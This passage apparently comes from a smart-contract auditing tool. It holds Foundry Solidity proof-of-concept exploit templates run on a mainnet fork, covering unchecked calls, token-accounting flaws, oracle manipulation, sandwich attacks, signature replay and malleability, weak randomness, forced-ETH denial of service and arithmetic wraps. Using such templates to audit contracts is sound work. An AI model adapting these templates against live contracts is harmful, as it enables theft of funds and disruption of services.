vm.prank(attackerEOA);\n        (bool ok,) = target.call(\n            abi.encodeWithSignature(\"destroy(address)\", attackerEOA)\n        );\n        if (!ok) {\n            vm.prank(attackerEOA);\n            (ok,) = target.call(abi.encodeWithSignature(\"destroy()\"));\n        }\n        require(ok, \"destroy call failed -- adapt to the target's destroy function\");\n        console.log(\"target balance before:\", targetBefore);\n        console.log(\"target balance after:\", target.balance);\n        assertEq(target.balance, 0, \"exploit did not reproduce: target balance not swept\");\n    }\n\n    function test_forcedEth() public {\n        uint256 targetBefore = target.balance;\n        // Force-feed 1 ETH via constructor selfdestruct. Works even if\n        // the target has no payable fallback and rejects transfers.\n        // NOTE: assert >=, not ==. On a fork, the Forcer's deterministic\n        // CREATE address may already hold mainnet dust, which the\n        // constructor selfdestruct forwards along with the 1 ETH.\n        // (Observed: a CREATE address holding 577021548053172 wei.)\n        new Forcer{value: 1 ether}(payable(target));\n        console.log(\"target balance before force-feed:\", targetBefore);\n        console.log(\"target balance after force-feed:\", target.balance);\n        assertGe(target.balance, targetBefore + 1 ether, \"forced ETH did not land\");\n    }\n}\n",
  "13-unchecked-call.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Unchecked low-level call return\n/// @notice Detector: unchecked-call / bytecode-unchecked-call. The target\n///         does a low-level call and IGNORES whether it succeeded. If the\n///         callee reverts, the target still records success -- funds, state,\n///         or accounting diverge from reality.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt execute() to the target's\n///      real function that makes the unchecked call.\n\ncontract Reverter {\n    fallback() external payable {\n        revert(\"callee reverts\");\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        Reverter reverter = new Reverter();\n\n        // The target calls the reverter and (vulnerably) ignores the\n        // failure, completing as if the call succeeded.\n        // TODO: adapt to the target's real unchecked-call function.\n        (bool ok,) = target.call(\n            abi.encodeWithSignature(\"execute(address,bytes)\", address(reverter), bytes(\"\"))\n        );\n        require(ok, \"execute(address,bytes) call failed -- adapt to the target's function\");\n        console.log(\"target completed despite callee reverting -- unchecked call proven\");\n        // A correct target bubbles the revert (or checks success), so the\n        // outer call reverts and this test fails -- the right signal.\n        assertTrue(ok, \"exploit did not reproduce: target did not ignore the failed call\");\n    }\n}\n",
  "14-erc20-unchecked-bool.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Unchecked ERC-20 bool (non-standard token)\n/// @notice Detector: erc20-unchecked. The target calls token.transfer()\n///         and ignores the bool. Some tokens (USDT-style) return FALSE\n///         instead of reverting on failure -- the target then credits a\n///         transfer that never happened.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. Uses a mock token that always returns\n///      false. TODO: adapt setToken() / the token-transfer flow to the\n///      target, and follow up by checking the target's accounting.\n\ncontract MockFalseToken {\n    string public constant name = \"MockFalse\";\n    string public constant symbol = \"FALSE\";\n    uint8 public constant decimals = 18;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    function transfer(address, uint256) external pure returns (bool) {\n        return false; // transfer \"fails\" but does not revert\n    }\n\n    function transferFrom(address, address, uint256) external pure returns (bool) {\n        return false;\n    }\n\n    function approve(address spender, uint256 amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        return true;\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        MockFalseToken mock = new MockFalseToken();\n\n        // Point the target at the false-returning token.\n        // TODO: adapt to the target's real token setter (or deploy the\n        // target's flow against a token that returns false on this fork).\n        (bool setOk,) = target.call(\n            abi.encodeWithSignature(\"setToken(address)\", address(mock))\n        );\n        require(setOk, \"setToken(address) failed -- adapt to the target's token setter\");\n\n        // Trigger the target's token-transfer flow.\n        // TODO: adapt to the real flow (withdraw / claim / redeem).\n        (bool ok,) = target.call(abi.encodeWithSignature(\"withdraw(uint256)\", 100 ether));\n        console.log(\"target flow completed despite token returning false:\", ok);\n        // A correct target reverts on a false return; a vulnerable one\n        // completes as if the transfer succeeded.\n        assertTrue(ok, \"exploit did not reproduce: target checked the bool\");\n    }\n}\n",
  "15-fee-on-transfer.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Fee-on-transfer accounting mismatch\n/// @notice Detector: fee-on-transfer. The target assumes a token transfer\n///         moved the FULL amount, but a fee-on-transfer token delivers\n///         less. The target credits the full amount, so its ledger exceeds\n///         its real balance -- later withdrawals overpay / brick.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. Uses a mock 10%-fee token. TODO: adapt\n///      setToken() / deposit() / the credit view to the target.\n\ncontract MockFoTToken {\n    string public constant name = \"MockFoT\";\n    string public constant symbol = \"FOT\";\n    uint8 public constant decimals = 18;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    constructor() {\n        balanceOf[msg.sender] = 1_000_000 ether;\n    }\n\n    // Takes a 10% fee on every transfer.\n    function transfer(address to, uint256 amount) external returns (bool) {\n        require(balanceOf[msg.sender] >= amount, \"insufficient\");\n        balanceOf[msg.sender] -= amount;\n        balanceOf[to] += (amount * 90) / 100;\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint256 amount) external returns (bool) {\n        require(allowance[from][msg.sender] >= amount, \"allowance\");\n        allowance[from][msg.sender] -= amount;\n        balanceOf[from] -= amount;\n        balanceOf[to] += (amount * 90) / 100;\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        return true;\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        MockFoTToken mock = new MockFoTToken();\n\n        // Give the attacker FoT tokens.\n        mock.transfer(attackerEOA, 1000 ether);\n\n        (bool setOk,) = target.call(\n            abi.encodeWithSignature(\"setToken(address)\", address(mock))\n        );\n        require(setOk, \"setToken(address) failed -- adapt to the target's token setter\");\n\n        // TODO: adapt to the target's real deposit + credit view.\n        vm.prank(attackerEOA);\n        (bool approveOk,) = address(mock).call(\n            abi.encodeWithSignature(\"approve(address,uint256)\", target, 100 ether)\n        );\n        require(approveOk, \"approve failed\");\n        vm.prank(attackerEOA);\n        (bool depOk,) = target.call(\n            abi.encodeWithSignature(\"deposit(uint256)\", 100 ether)\n        );\n        require(depOk, \"deposit failed -- adapt to the target's deposit function\");\n\n        (bool credOk, bytes memory ret) =\n            target.staticcall(abi.encodeWithSignature(\"credits(address)\", attackerEOA));\n        require(credOk, \"target has no credits(address) view -- adapt the accounting check\");\n        uint256 credited = abi.decode(ret, (uint256));\n        uint256 actuallyReceived = mock.balanceOf(target);\n        console.log(\"credited by target:\", credited);\n        console.log(\"actually received:\", actuallyReceived);\n        // Vulnerable: credited 100, received 90. Correct: credited 90.\n        assertGt(credited, actuallyReceived, \"exploit did not reproduce: target measured the real amount\");\n    }\n}\n",
  "16-oracle-manipulation.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Oracle manipulation (spot price + balance-as-price)\n/// @notice Detectors: oracle-spot, balance-as-price. The target prices off\n///         a SPOT value (DEX reserves / its own token balance) instead of\n///         a TWAP / Chainlink feed. One big swap -- or a plain donation --\n///         moves the price, and the target lends / settles / mints at the\n///         manipulated price.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: set ROUTER / TOKEN / TARGET price\n///      view / the price-sensitive function to the real ones.\n\ninterface IRouter {\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n}\n\ninterface IERC20 {\n    function balanceOf(address who) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transfer(address to, uint256 amount) external returns (bool);\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n    // TODO: DEX router, tokens, and the target's price view.\n    address public constant ROUTER = address(0);\n    address public constant TOKEN_IN = address(0);\n    address public constant TOKEN_OUT = address(0);\n    address public constant WHALE = address(0); // holds TOKEN_IN on this fork\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function _readPrice() internal view returns (uint256) {\n        // TODO: adapt to the target's real price view (getPrice / price /\n        // getReserves-derived / exchangeRate).\n        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature(\"getPrice()\"));\n        require(ok, \"target has no getPrice() view -- adapt the price read\");\n        return abi.decode(ret, (uint256));\n    }\n\n    function test_spotPriceMovedByOneSwap() public {\n        require(ROUTER != address(0) && WHALE != address(0), \"set ROUTER / tokens / WHALE\");\n        address attackerEOA = makeAddr(\"attacker\");\n\n        vm.prank(WHALE);\n        IERC20(TOKEN_IN).transfer(attackerEOA, 1000 ether);\n        vm.prank(attackerEOA);\n        IERC20(TOKEN_IN).approve(ROUTER, 1000 ether);\n\n        uint256 priceBefore = _readPrice();\n        address[] memory path = new address[](2);\n        path[0] = TOKEN_IN;\n        path[1] = TOKEN_OUT;\n        vm.prank(attackerEOA);\n        IRouter(ROUTER).swapExactTokensForTokens(1000 ether, 0, path, attackerEOA, block.timestamp + 300);\n        uint256 priceAfter = _readPrice();\n\n        console.log(\"price before swap:\", priceBefore);\n        console.log(\"price after swap:\", priceAfter);\n        assertTrue(priceAfter != priceBefore, \"exploit did not reproduce: one swap did not move the price\");\n    }\n\n    function test_balanceAsPriceMovedByDonation() public {\n        require(TOKEN_OUT != address(0) && WHALE != address(0), \"set TOKEN_OUT / WHALE\");\n        address attackerEOA = makeAddr(\"attacker\");\n\n        vm.prank(WHALE);\n        IERC20(TOKEN_OUT).transfer(attackerEOA, 1000 ether);\n\n        uint256 priceBefore = _readPrice();\n        vm.prank(attackerEOA);\n        IERC20(TOKEN_OUT).transfer(target, 1000 ether);\n        uint256 priceAfter = _readPrice();\n\n        console.log(\"price before donation:\", priceBefore);\n        console.log(\"price after donation:\", priceAfter);\n        assertTrue(priceAfter != priceBefore, \"exploit did not reproduce: donation did not move the price\");\n    }\n}\n",
  "17-slippage-sandwich.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Sandwich attack on a zero-slippage swap\n/// @notice Detector: slippage. The target (or a victim flow it exposes)\n///         swaps with amountOutMin == 0. An attacker frontruns the victim\n///         swap (pushing the price up), lets the victim execute at the bad\n///         price, then backruns (sells) for a profit.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: set ROUTER / tokens / VICTIM /\n///      the victim's swap entry point. On a fork with a real DEX this\n///      runs for real -- the profit is the proof.\n\ninterface IRouter {\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n}\n\ninterface IERC20 {\n    function balanceOf(address who) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transfer(address to, uint256 amount) external returns (bool);\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n    // TODO: DEX router, token pair, victim, funding whale.\n    address public constant ROUTER = address(0);\n    address public constant TOKEN_IN = address(0);\n    address public constant TOKEN_OUT = address(0);\n    address public constant VICTIM = address(0);\n    address public constant WHALE = address(0);\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        require(ROUTER != address(0) && VICTIM != address(0) && WHALE != address(0), \"set ROUTER / tokens / VICTIM / WHALE\");\n\n        address attackerEOA = makeAddr(\"attacker\");\n\n        // Fund the attacker with TOKEN_IN from a whale.\n        vm.prank(WHALE);\n        IERC20(TOKEN_IN).transfer(attackerEOA, 200 ether);\n        vm.prank(attackerEOA);\n        IERC20(TOKEN_IN).approve(ROUTER, 200 ether);\n\n        uint256 attackerInBefore = IERC20(TOKEN_IN).balanceOf(attackerEOA);\n\n        address[] memory path = new address[](2);\n        path[0] = TOKEN_IN;\n        path[1] = TOKEN_OUT;\n        address[] memory backPath = new address[](2);\n        backPath[0] = TOKEN_OUT;\n        backPath[1] = TOKEN_IN;\n\n        // 1. Frontrun: attacker buys TOKEN_OUT, pushing the price up.\n        vm.prank(attackerEOA);\n        IRouter(ROUTER).swapExactTokensForTokens(100 ether, 0, path, attackerEOA, block.timestamp + 300);\n\n        // 2. Victim swap executes at the worsened price (zero slippage).\n        // TODO: replace with the target's real victim-swap call.\n        vm.prank(VICTIM);\n        (bool victimOk,) = target.call(\n            abi.encodeWithSignature(\"swap(uint256)\", 100 ether)\n        );\n        require(victimOk, \"victim swap call failed -- adapt to the target's swap entry point\");\n\n        // 3. Backrun: attacker sells TOKEN_OUT back.\n        uint256 outBal = IERC20(TOKEN_OUT).balanceOf(attackerEOA);\n        vm.prank(attackerEOA);\n        IERC20(TOKEN_OUT).approve(ROUTER, outBal);\n        vm.prank(attackerEOA);\n        IRouter(ROUTER).swapExactTokensForTokens(outBal, 0, backPath, attackerEOA, block.timestamp + 300);\n\n        uint256 attackerInAfter = IERC20(TOKEN_IN).balanceOf(attackerEOA);\n        console.log(\"attacker TOKEN_IN before:\", attackerInBefore);\n        console.log(\"attacker TOKEN_IN after:\", attackerInAfter);\n        assertGt(attackerInAfter, attackerInBefore, \"exploit did not reproduce: sandwich was not profitable\");\n\n    }\n}\n",
  "18-signature-replay.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Signature replay (no nonce / deadline / chain binding)\n/// @notice Detector: signature-replay. The target verifies a signature\n///         without a nonce, deadline, or chainId binding, so the SAME\n///         signature can be submitted twice (or on another chain / another\n///         contract using the same verifier) and accepted again.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt the signed payload to the\n///      target's exact scheme (EIP-712 domain / eth-signed message /\n///      raw hash) and claim() to its real entry point.\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n    // Test signer -- the target must trust signatures from this key's\n    // address (e.g. the target's owner / authorized signer).\n    uint256 public constant SIGNER_KEY = 0xA11CE;\n    // TODO: the exact message the target expects to be signed.\n    bytes32 public constant MESSAGE_HASH = bytes32(0);\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        require(MESSAGE_HASH != bytes32(0), \"set MESSAGE_HASH to the target's signed message hash\");\n\n        address signer = vm.addr(SIGNER_KEY);\n        console.log(\"signer:\", signer);\n        // TODO: sign the exact digest the target verifies (EIP-712 digest\n        // or keccak256(\"\\x19Ethereum Signed Message:\\n32\" + hash)).\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(SIGNER_KEY, MESSAGE_HASH);\n        bytes memory sig = abi.encodePacked(r, s, v);\n\n        // TODO: adapt to the target's real claim / redeem / execute entry.\n        (bool firstOk,) = target.call(\n            abi.encodeWithSignature(\"claim(bytes)\", sig)\n        );\n        require(firstOk, \"first claim failed -- adapt the signed payload / entry point\");\n\n        // Replay the EXACT same signature.\n        (bool secondOk,) = target.call(\n            abi.encodeWithSignature(\"claim(bytes)\", sig)\n        );\n        console.log(\"first claim ok:\", firstOk);\n        console.log(\"replay claim ok:\", secondOk);\n        assertTrue(secondOk, \"exploit did not reproduce: replay was rejected (nonce present)\");\n\n    }\n}\n",
  "19-signature-malleability.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Signature malleability (low-s not enforced)\n/// @notice Detector: signature-malleability. The target verifies a\n///         signature without enforcing low-s, so a signature (v, r, s)\n///         can be transformed into a DIFFERENT valid signature\n///         (v', r, n - s) for the same message -- double-spending a\n///         \"one signature\" allowance, or forging a second authorization.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt the digest + entry point to\n///      the target's real signature scheme.\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n    uint256 public constant SIGNER_KEY = 0xA11CE;\n    // TODO: the exact message hash the target verifies.\n    bytes32 public constant MESSAGE_HASH = bytes32(0);\n    // secp256k1 curve order.\n    uint256 public constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        require(MESSAGE_HASH != bytes32(0), \"set MESSAGE_HASH to the target's signed message hash\");\n\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(SIGNER_KEY, MESSAGE_HASH);\n        // Malleated twin: same message, different (v, s).\n        uint8 v2 = v == 27 ? 28 : 27;\n        bytes32 s2 = bytes32(N - uint256(s));\n        require(s2 != s, \"degenerate signature -- pick another message\");\n\n        bytes memory sig1 = abi.encodePacked(r, s, v);\n        bytes memory sig2 = abi.encodePacked(r, s2, v2);\n\n        // TODO: adapt to the target's real signature entry point.\n        (bool firstOk,) = target.call(\n            abi.encodeWithSignature(\"submit(bytes32,bytes)\", MESSAGE_HASH, sig1)\n        );\n        require(firstOk, \"original signature rejected -- adapt the digest / entry point\");\n        (bool secondOk,) = target.call(\n            abi.encodeWithSignature(\"submit(bytes32,bytes)\", MESSAGE_HASH, sig2)\n        );\n        console.log(\"original sig accepted:\", firstOk);\n        console.log(\"malleated sig accepted:\", secondOk);\n        assertTrue(secondOk, \"exploit did not reproduce: malleated signature was rejected (low-s enforced)\");\n\n    }\n}\n",
  "20-chain-randomness-timestamp.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Chain randomness + timestamp dependence\n/// @notice Detectors: weak-randomness, timestamp, bytecode-timestamp.\n///         The target draws \"randomness\" from block data (blockhash,\n///         block.timestamp, block.prevrandao) or branches on\n///         block.timestamp. Both are attacker-influenced: a miner/validator\n///         shifts them, and anyone can predict them before playing.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt play() / the win condition /\n///      unlockTime() to the target.\n\ninterface IGame {\n    function play() external payable;\n    function lastWinner() external view returns (address);\n    function unlockTime() external view returns (uint256);\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_timestampGateBypassedByWarp() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 1 ether);\n\n        // TODO: adapt to the target's real time-gated function.\n        uint256 unlock = IGame(target).unlockTime();\n        require(unlock > block.timestamp, \"already unlocked at this fork block\");\n        vm.warp(unlock + 1);\n\n        vm.prank(attackerEOA);\n        (bool ok,) = target.call(abi.encodeWithSignature(\"withdraw()\"));\n        console.log(\"withdraw after warp ok:\", ok);\n        assertTrue(ok, \"exploit did not reproduce: time gate still held after warp\");\n    }\n\n    function test_randomnessPredicted() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 1 ether);\n\n        // TODO: mirror the target's exact randomness formula here, then\n        // play at the block/timestamp where the formula favors the caller.\n        // Example shape (common): keccak256(block.timestamp, prevrandao).\n        vm.warp(block.timestamp + 1);\n        vm.roll(block.number + 1);\n\n        vm.prank(attackerEOA);\n        (bool ok,) = target.call(abi.encodeWithSignature(\"play()\"));\n        require(ok, \"play() call failed -- adapt to the target's play function\");\n\n        (bool winOk, bytes memory ret) =\n            target.staticcall(abi.encodeWithSignature(\"lastWinner()\"));\n        require(winOk, \"target has no lastWinner() view -- adapt the win check\");\n        address winner = abi.decode(ret, (address));\n        console.log(\"winner:\", winner);\n        assertEq(winner, attackerEOA, \"exploit did not reproduce: attacker did not win at the chosen block\");\n    }\n}\n",
  "21-strict-balance-dos.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Strict balance equality DoS (forced ETH breaks ==)\n/// @notice Detector: strict-balance. The target requires\n///         address(this).balance == EXACT. Anyone can force-feed ETH\n///         (selfdestruct / coinbase) so the equality NEVER holds again,\n///         permanently bricking the gated function.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt the gated function to the\n///      target's real one.\n\ncontract Forcer {\n    constructor(address payable to) payable {\n        selfdestruct(to);\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 1 ether);\n\n        // TODO: adapt to the target's real balance-gated function.\n        bytes memory gatedCall = abi.encodeWithSignature(\"distribute()\");\n\n        // Force-feed 1 wei so address(this).balance can never equal the\n        // exact value again.\n        new Forcer{value: 1 wei}(payable(target));\n\n        vm.prank(attackerEOA);\n        (bool ok,) = target.call(gatedCall);\n        console.log(\"gated function ok after force-feed:\", ok);\n        assertTrue(!ok, \"exploit did not reproduce: gated function still works after force-feed\");\n    }\n}\n",
  "22-msg-value-loop.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- msg.value used inside a loop\n/// @notice Detector: msg-value-loop. The target references msg.value inside\n///         a loop -- e.g. paying / refunding msg.value PER ITERATION instead\n///         of once. One call with n iterations then pays out n x msg.value.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt buy() / the iteration count /\n///      the per-item price to the target.\n\ninterface IVictim {\n    function buy(uint256 n) external payable;\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n    // TODO: the per-item price the target charges.\n    uint256 public constant PRICE = 0;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        require(PRICE > 0, \"set PRICE to the per-item price\");\n\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 10 ether);\n\n        uint256 attackerBefore = attackerEOA.balance;\n        // One call, n = 3, paying for ONE item. If the loop pays/refunds\n        // msg.value per iteration, the caller nets extra value.\n        vm.prank(attackerEOA);\n        IVictim(target).buy{value: PRICE}(3);\n        uint256 attackerAfter = attackerEOA.balance;\n\n        // Attacker paid PRICE once; if the loop paid out per iteration,\n        // the attacker's net outflow is less than PRICE (or they gained).\n        console.log(\"attacker balance before:\", attackerBefore);\n        console.log(\"attacker balance after:\", attackerAfter);\n        assertGt(\n            attackerAfter,\n            attackerBefore - PRICE,\n            \"exploit did not reproduce: no per-iteration msg.value leak\"\n        );\n\n    }\n}\n",
  "23-unchecked-arithmetic-wrap.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Unchecked arithmetic wraps (no overflow check)\n/// @notice Detector: unchecked-block. The target does arithmetic in an\n///         `unchecked {}` block (or pre-0.8 code with no SafeMath), so\n///         values WRAP instead of reverting -- minting, balances, and\n///         accounting can overflow into tiny / huge values.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt add() to the target's real\n///      unchecked arithmetic function.\n\ninterface IVictim {\n    function add(uint256 a, uint256 b) external returns (uint256);\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        